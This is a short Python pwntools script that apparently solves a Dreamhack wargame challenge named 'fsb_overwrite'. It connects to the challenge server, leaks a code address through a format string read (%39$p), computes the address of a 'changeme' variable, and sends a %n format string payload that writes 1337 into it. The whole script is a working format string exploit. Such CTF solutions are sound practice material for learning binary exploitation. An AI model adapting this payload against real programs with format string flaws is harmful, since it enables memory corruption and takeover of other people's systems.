from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./fsb_overwrite', checksec=False)

offset = 0x000000000000401c - 0x0000000000001120

#r = process(exe.path)
r = remote('host3.dreamhack.games', 14104)
#gdb.attach(r)
r.send(b'%39$p')
start_addr = int(r.recvline()[:-1],16)
changeme_addr = start_addr + offset
log.info("The address of _start: " + hex(start_addr))
log.info("The address of changeme variable: " + hex(changeme_addr))

payload = b'%1337c%8$n\x00|||||'
payload += p64(changeme_addr)

r.send(payload)

r.interactive()